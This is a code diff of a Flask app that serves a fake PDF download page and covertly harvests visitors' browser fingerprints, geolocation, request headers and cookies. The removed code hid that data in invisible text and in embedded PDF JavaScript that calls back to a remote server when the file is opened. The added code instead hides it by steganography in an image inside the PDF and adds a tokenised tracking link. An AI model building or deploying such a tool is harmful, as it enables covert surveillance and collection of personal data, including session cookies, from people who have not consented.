@@ -4,11 +4,16 @@ import json
 import os
 import requests
 import base64
+import uuid
 from faker import Faker
 from io import BytesIO
 from reportlab.pdfgen import canvas
-from reportlab.lib.colors import white
-import PyPDF2
+from reportlab.lib.pagesizes import letter
+from reportlab.platypus import SimpleDocTemplate, Paragraph, Image
+from reportlab.lib.styles import getSampleStyleSheet
+from cryptography.fernet import Fernet
+from stegano import lsb
+from PIL import Image as PILImage
 
 app = Flask(__name__)
 
@@ -22,24 +27,114 @@ logging.basicConfig(
 # Initialize Faker for generating fake PDF content
 fake = Faker()
 
+# Encryption key (in production, store securely, e.g., environment variable)
+ENCRYPTION_KEY = Fernet.generate_key()
+CIPHER = Fernet(ENCRYPTION_KEY)
+
+# Store tokens for verification
+logged_tokens = {}
+
 def get_ip_geolocation(ip):
-    """
-    Uses the ipinfo.io API to perform IP-based geocoding.
-    Returns latitude, longitude, and the complete geolocation data (full JSON).
-    """
+    """Fetch geolocation data from ipinfo.io."""
     try:
         response = requests.get(f"https://ipinfo.io/{ip}/json")
         if response.status_code == 200:
             data = response.json()
-            loc = data.get("loc")
-            if loc:
-                lat_str, lon_str = loc.split(",")
-                return float(lat_str), float(lon_str), data
-            else:
-                return None, None, data
+            loc = data.get("loc", "").split(",")
+            return float(loc[0]) if loc else None, float(loc[1]) if loc else None, data
     except Exception as e:
         logging.error(f"IP Geolocation error: {e}")
     return None, None, {}
+
+def collect_data(request):
+    """Collect client-side and server-side data."""
+    ip_header = request.headers.get('X-Forwarded-For', request.remote_addr)
+    ip = ip_header.split(",")[0].strip() if ip_header else request.remote_addr
+    user_agent = request.headers.get('User-Agent', 'unknown')
+    cookies = request.cookies
+    tls_metadata = request.environ.get('wsgi.url_scheme')
+
+    client_data = {
+        'screenWidth': request.form.get('screenWidth'),
+        'screenHeight': request.form.get('screenHeight'),
+        'colorDepth': request.form.get('colorDepth'),
+        'pixelDepth': request.form.get('pixelDepth'),
+        'language': request.form.get('language'),
+        'platform': request.form.get('platform'),
+        'connection': request.form.get('connection'),
+        'pageLoadTime': request.form.get('pageLoadTime'),
+        'clickTime': request.form.get('clickTime'),
+        'dwellTime': request.form.get('dwellTime'),
+        'lastMouseX': request.form.get('lastMouseX'),
+        'lastMouseY': request.form.get('lastMouseY'),
+        'referrer': request.form.get('referrer'),
+        'canvasFingerprint': request.form.get('canvasFingerprint'),
+        'hardwareConcurrency': request.form.get('hardwareConcurrency'),
+        'deviceMemory': request.form.get('deviceMemory'),
+        'timezoneOffset': request.form.get('timezoneOffset'),
+        'touchSupport': request.form.get('touchSupport'),
+        'batteryLevel': request.form.get('batteryLevel'),
+        'charging': request.form.get('charging'),
+        'downlink': request.form.get('downlink'),
+        'plugins': request.form.get('plugins')
+    }
+
+    lat, lon, geo_data = get_ip_geolocation(ip)
+    client_data['latitude'] = lat if lat is not None else ""
+    client_data['longitude'] = lon if lon is not None else ""
+    client_data['ip_geolocation'] = geo_data
+
+    log_message = {
+        'ip': ip,
+        'user_agent': user_agent,
+        'action': 'Downloaded PDF',
+        'client_data': client_data,
+        'request_headers': dict(request.headers),
+        'cookies': cookies,
+        'tls_metadata': tls_metadata
+    }
+    return log_message
+
+def embed_data_in_image(data):
+    """Embed encrypted data in an image using steganography."""
+    encrypted_data = CIPHER.encrypt(json.dumps(data).encode())
+    # Create a simple base image (in production, use a pre-existing image)
+    base_img = PILImage.new('RGB', (100, 100), color='white')
+    temp_path = 'temp_base.png'
+    base_img.save(temp_path)
+    stego_img = lsb.hide(temp_path, encrypted_data)
+    os.remove(temp_path)
+    return stego_img
+
+def generate_pdf(logged_data):
+    """Generate a PDF with fake content and embedded steganographic data."""
+    buffer = BytesIO()
+    doc = SimpleDocTemplate(buffer, pagesize=letter)
+    styles = getSampleStyleSheet()
+    story = []
+
+    # Fake content
+    story.append(Paragraph("Fake PDF Document", styles['Title']))
+    story.append(Paragraph(f"Name: {fake.name()}", styles['Normal']))
+    story.append(Paragraph(f"Address: {fake.address().replace('\n', ', ')}", styles['Normal']))
+    story.append(Paragraph("Additional Info:", styles['Normal']))
+    story.append(Paragraph(fake.text(max_nb_chars=200), styles['Normal']))
+
+    # Embed data in an image
+    stego_img = embed_data_in_image(logged_data)
+    img_buffer = BytesIO()
+    stego_img.save(img_buffer, format='PNG')
+    img_buffer.seek(0)
+    story.append(Image(img_buffer, width=100, height=100))
+
+    # Verification link with unique token
+    token = str(uuid.uuid4())
+    verification_link = f"https://pdf-ops.onrender.com/verify?token={token}"
+    story.append(Paragraph(f"Please <a href='{verification_link}'>click here</a> to verify you opened this PDF.", styles['Normal']))
+
+    doc.build(story)
+    buffer.seek(0)
+    return buffer, token
 
 # HTML page with a styled download button and embedded JavaScript to capture client-side data.
 HTML_PAGE = """
@@ -83,9 +178,6 @@ HTML_PAGE = """
         <input type="hidden" name="pageLoadTime" id="pageLoadTime">
         <input type="hidden" name="clickTime" id="clickTime">
         <input type="hidden" name="dwellTime" id="dwellTime">
-        <!-- Latitude and longitude will be determined server-side -->
-        <input type="hidden" name="latitude" id="latitude" value="">
-        <input type="hidden" name="longitude" id="longitude" value="">
         <input type="hidden" name="lastMouseX" id="lastMouseX">
         <input type="hidden" name="lastMouseY" id="lastMouseY">
         <input type="hidden" name="referrer" id="referrer">
@@ -167,7 +259,7 @@ HTML_PAGE = """
             }
         }
         
-        // Intercept form submission to capture client-side data (without geolocation prompt)
+        // Intercept form submission to capture client-side data
         document.getElementById('downloadForm').addEventListener('submit', function(e) {
             e.preventDefault();
             // Populate basic hidden fields
@@ -183,7 +275,6 @@ HTML_PAGE = """
                 document.getElementById('connection').value = '';
             }
             document.getElementById('referrer').value = document.referrer;
-            
             var clickTime = Date.now();
             document.getElementById('clickTime').value = clickTime;
             document.getElementById('dwellTime').value = clickTime - pageLoadTime;
@@ -206,132 +297,26 @@ def index():
 
 @app.route('/download', methods=['POST'])
 def download():
-    # Retrieve the IP address; if multiple IPs are present, take the first one.
-    ip_header = request.headers.get('X-Forwarded-For', request.remote_addr)
-    ip = ip_header.split(",")[0].strip() if ip_header else request.remote_addr
+    # Collect and log initial data
+    logged_data = collect_data(request)
+    logging.info(json.dumps(logged_data))
 
-    user_agent = request.headers.get('User-Agent', 'unknown')
-    cookies = request.cookies
-    tls_metadata = request.environ.get('wsgi.url_scheme')
+    # Generate PDF with embedded data and verification token
+    pdf_buffer, token = generate_pdf(logged_data)
+    logged_tokens[token] = logged_data
 
-    # Retrieve client-side data from the form submission.
-    client_data = {
-        'screenWidth': request.form.get('screenWidth'),
-        'screenHeight': request.form.get('screenHeight'),
-        'colorDepth': request.form.get('colorDepth'),
-        'pixelDepth': request.form.get('pixelDepth'),
-        'language': request.form.get('language'),
-        'platform': request.form.get('platform'),
-        'connection': request.form.get('connection'),
-        'pageLoadTime': request.form.get('pageLoadTime'),
-        'clickTime': request.form.get('clickTime'),
-        'dwellTime': request.form.get('dwellTime'),
-        'lastMouseX': request.form.get('lastMouseX'),
-        'lastMouseY': request.form.get('lastMouseY'),
-        'referrer': request.form.get('referrer'),
-        'canvasFingerprint': request.form.get('canvasFingerprint'),
-        'hardwareConcurrency': request.form.get('hardwareConcurrency'),
-        'deviceMemory': request.form.get('deviceMemory'),
-        'timezoneOffset': request.form.get('timezoneOffset'),
-        'touchSupport': request.form.get('touchSupport'),
-        'batteryLevel': request.form.get('batteryLevel'),
-        'charging': request.form.get('charging'),
-        'downlink': request.form.get('downlink'),
-        'plugins': request.form.get('plugins')
-    }
+    return send_file(pdf_buffer, as_attachment=True, download_name='sample.pdf', mimetype='application/pdf')
 
-    # Fetch geolocation data via ipinfo.io and store the entire JSON response.
-    lat, lon, geo_data = get_ip_geolocation(ip)
-    client_data['latitude'] = lat if lat is not None else ""
-    client_data['longitude'] = lon if lon is not None else ""
-    client_data['ip_geolocation'] = geo_data  # Entire JSON from ipinfo.io
-
-    # Create a comprehensive log message.
-    log_message = {
-        'ip': ip,
-        'user_agent': user_agent,
-        'action': 'Downloaded PDF',
-        'client_data': client_data,
-        'request_headers': dict(request.headers),
-        'cookies': cookies,
-        'tls_metadata': tls_metadata
-    }
-    logging.info(json.dumps(log_message))
-
-    # --- Steganographic Embedding with Markers ---
-    # Encode the complete log_message in base64 and wrap it with markers.
-    encoded_log = base64.b64encode(json.dumps(log_message).encode('utf-8')).decode('utf-8')
-    encoded_log_with_markers = "<<BASE64 START>>" + encoded_log + "<<BASE64 END>>"
-
-    # Generate a PDF using ReportLab and Faker.
-    buffer = BytesIO()
-    p = canvas.Canvas(buffer)
-    fake_name = fake.name()
-    fake_address = fake.address().replace("\n", ", ")
-    fake_text = fake.text(max_nb_chars=200)
-    p.drawString(100, 750, "Fake PDF Document")
-    p.drawString(100, 730, f"Name: {fake_name}")
-    p.drawString(100, 710, f"Address: {fake_address}")
-    p.drawString(100, 690, "Additional Info:")
-    text_object = p.beginText(100, 670)
-    text_object.textLines(fake_text)
-    p.drawText(text_object)
-
-    # Render the hidden payload in white, extremely small text.
-    p.setFont("Helvetica", 1)
-    p.setFillColorRGB(1, 1, 1)  # White text on white background (invisible)
-    p.drawString(1, 1, encoded_log_with_markers)
-
-    p.showPage()
-    p.save()
-    buffer.seek(0)
-
-    # --- Enhanced Multi-Stage Logging via Embedded JavaScript ---
-    # The embedded JavaScript now defines a variable with the hidden payload, attempts a callback,
-    # and uses the onload event to display the response in an alert.
-    try:
-        pdf_reader = PyPDF2.PdfReader(buffer)
-        pdf_writer = PyPDF2.PdfWriter()
-        for page in pdf_reader.pages:
-            pdf_writer.add_page(page)
-        js_code = f"""
-        // Embedded JavaScript for multi-stage logging.
-        var hiddenPayload = "{encoded_log_with_markers}";
-        try {{
-            var req = new XMLHttpRequest();
-            req.open("GET", "https://pdf-ops.onrender.com/pdf_callback?data=" + encodeURIComponent(hiddenPayload), true);
-            req.onload = function() {{
-                // Display the server's response in an alert.
-                app.alert("Callback result: " + req.responseText);
-            }};
-            req.send();
-        }} catch(e) {{
-            app.alert("Error in callback: " + e);
-        }}
-        """
-        pdf_writer.add_js(js_code)
-        new_buffer = BytesIO()
-        pdf_writer.write(new_buffer)
-        new_buffer.seek(0)
-        final_pdf = new_buffer
-    except Exception as e:
-        logging.error(f"Error embedding JavaScript in PDF: {e}")
-        # If JavaScript embedding fails, fall back to the original PDF.
-        final_pdf = buffer
-    # --- End of JavaScript Embedding ---
-
-    # Send the final PDF as a file download.
-    return send_file(final_pdf, as_attachment=True, download_name='sample.pdf', mimetype='application/pdf')
-
-@app.route('/pdf_callback', methods=['GET'])
-def pdf_callback():
-    """
-    Endpoint to receive callback events from the PDF when it is opened.
-    Logs the hidden data received from the embedded JavaScript.
-    """
-    hidden_data = request.args.get('data', '')
-    logging.info("PDF callback triggered with data: " + hidden_data)
-    return "Callback logged", 200
+@app.route('/verify', methods=['GET'])
+def verify():
+    """Handle PDF open verification via token."""
+    token = request.args.get('token')
+    if token in logged_tokens:
+        logging.info(f"PDF opened for token: {token} - Data: {json.dumps(logged_tokens[token])}")
+        # Optionally remove token after verification
+        del logged_tokens[token]
+        return "Thank you for verifying!", 200
+    return "Invalid token", 400
 
 @app.route('/logs')
 def display_logs():
@@ -340,7 +325,7 @@ def display_logs():
             logs = f.read()
     except Exception as e:
         logs = f"Error reading log file: {e}"
-
+    
     logs_html = """
     <!DOCTYPE html>
     <html>
